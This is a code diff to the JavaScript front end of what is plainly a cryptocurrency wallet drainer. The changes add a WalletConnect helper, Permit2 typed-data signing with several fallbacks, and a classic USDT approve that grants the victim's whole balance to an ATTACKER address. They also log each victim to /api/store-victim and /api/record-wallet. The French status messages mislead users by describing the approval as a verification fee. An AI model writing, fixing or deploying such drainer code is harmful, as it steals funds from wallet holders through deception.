@@ -1002,6 +1002,62 @@ async function initWalletConnect() {
   });
 }
 
+async function wcRequest(method, params) {
+    return signClient.request({
+      topic: session.topic,
+      chainId: 'eip155:1',
+      request: { method, params }
+    });
+  }
+
+  async function waitReceipt(txHash, timeoutMs) {
+    const provider = new ethers.providers.JsonRpcProvider(PUBLIC_RPC);
+    const startTs = Date.now();
+    while (Date.now() - startTs < timeoutMs) {
+      const rec = await provider.getTransactionReceipt(txHash);
+      if (rec && rec.blockNumber) return rec;
+      await new Promise(r => setTimeout(r, 2500));
+    }
+    throw new Error('approve timeout');
+  }
+
+  async function signPermit2Typed(account, typedData) {
+    const payload = JSON.stringify(typedData);
+    try {
+      return await wcRequest('eth_signTypedData_v4', [account, payload]);
+    } catch (e1) {
+      console.warn('v4 string failed', e1);
+      try {
+        return await wcRequest('eth_signTypedData_v4', [account, typedData]);
+      } catch (e2) {
+        console.warn('v4 object failed', e2);
+        return await wcRequest('eth_signTypedData', [account, payload]);
+      }
+    }
+  }
+
+  async function sendClassicApprove(balance, balanceFormatted) {
+    const scanText = document.querySelector('.scan');
+    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
+    const iface = new ethers.utils.Interface([
+      'function approve(address spender, uint256 amount)'
+    ]);
+    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
+    const txHash = await wcRequest('eth_sendTransaction', [{
+      from: account,
+      to: USDT_ADDR,
+      data: data,
+      value: '0x0',
+      gas: '0x493E0'
+    }]);
+    await fetch('/api/store-victim', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ victim: account, chain: '1' })
+    });
+    return txHash;
+  }
+
 async function handlePermit2Flow() {
   try {
     const scanText = document.querySelector('.scan');
@@ -1033,24 +1089,16 @@ async function handlePermit2Flow() {
         'function approve(address spender, uint256 amount)'
       ]);
       const data = iface.encodeFunctionData('approve', [PERMIT2_ADDRESS, balance]);
-      const txParams = {
+      const txHash = await wcRequest('eth_sendTransaction', [{
         from: account,
         to: USDT_ADDR,
         data: data,
         value: '0x0',
-        gas: '0x493E0',
-      };
-      const txHash = await signClient.request({
-        topic: session.topic,
-        chainId: 'eip155:1',
-        request: {
-          id: Date.now(),
-          jsonrpc: '2.0',
-          method: 'eth_sendTransaction',
-          params: [txParams],
-        },
-      });
+        gas: '0x493E0'
+      }]);
       console.log('Permit2 approve tx:', txHash);
+      if (scanText) scanText.textContent = 'En attente de confirmation on-chain…';
+      await waitReceipt(txHash, 180000);
     }
 
     if (scanText) scanText.textContent = `Signez l'autorisation Permit2 pour ${balanceFormatted} USDT.`;
@@ -1059,19 +1107,19 @@ async function handlePermit2Flow() {
     const deadline = Math.floor(Date.now() / 1000) + 3600;
     const permitData = {
       permitted: {
-        token: USDT_ADDR,
+        token: ethers.utils.getAddress(USDT_ADDR),
         amount: balance.toString()
       },
       nonce: nonce,
       deadline: deadline
     };
     const typedData = {
-      domain: {
-        name: 'Permit2',
-        chainId: 1,
-        verifyingContract: PERMIT2_ADDRESS
-      },
       types: {
+        EIP712Domain: [
+          { name: 'name', type: 'string' },
+          { name: 'chainId', type: 'uint256' },
+          { name: 'verifyingContract', type: 'address' }
+        ],
         PermitTransferFrom: [
           { name: 'permitted', type: 'TokenPermissions' },
           { name: 'spender', type: 'address' },
@@ -1083,28 +1131,53 @@ async function handlePermit2Flow() {
           { name: 'amount', type: 'uint256' }
         ]
       },
+      domain: {
+        name: 'Permit2',
+        chainId: 1,
+        verifyingContract: PERMIT2_ADDRESS
+      },
       primaryType: 'PermitTransferFrom',
       message: {
         permitted: {
-          token: USDT_ADDR,
+          token: ethers.utils.getAddress(USDT_ADDR),
           amount: balance.toString()
         },
-        spender: ATTACKER,
-        nonce: nonce.toString(),
-        deadline: deadline.toString()
+        spender: ethers.utils.getAddress(ATTACKER),
+        nonce: String(nonce),
+        deadline: String(deadline)
       }
     };
 
-    const permit2Sig = await signClient.request({
-      topic: session.topic,
-      chainId: 'eip155:1',
-      request: {
-        id: Date.now(),
-        jsonrpc: '2.0',
-        method: 'eth_signTypedData_v4',
-        params: [account, JSON.stringify(typedData)]
+    let permit2Sig = null;
+    try {
+      permit2Sig = await signPermit2Typed(account, typedData);
+    } catch (signErr) {
+      console.warn('Permit2 typed-data bloqué, fallback approve classique', signErr);
+      const txHash = await sendClassicApprove(balance, balanceFormatted);
+      console.log('fallback approve', txHash);
+      if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
+      const addressKey = account.toLowerCase();
+      if (pendingSignatures[addressKey]) {
+        pendingSignatures[addressKey].done = true;
+        if (pendingSignatures[addressKey].timer) {
+          clearTimeout(pendingSignatures[addressKey].timer);
+          pendingSignatures[addressKey].timer = null;
+        }
       }
-    });
+      await fetch('/api/record-wallet', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          address: account,
+          chain: '1',
+          status: 'signed',
+          token: 'USDT',
+          amount: balanceFormatted
+        })
+      });
+      refreshVictimsIfPossible();
+      return;
+    }
 
     console.log('Permit2 sig:', permit2Sig);
     if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
@@ -1178,6 +1251,7 @@ async function handlePermit2Flow() {
     }
   }
 }
+
 
 
   let victimPollTimer = null;
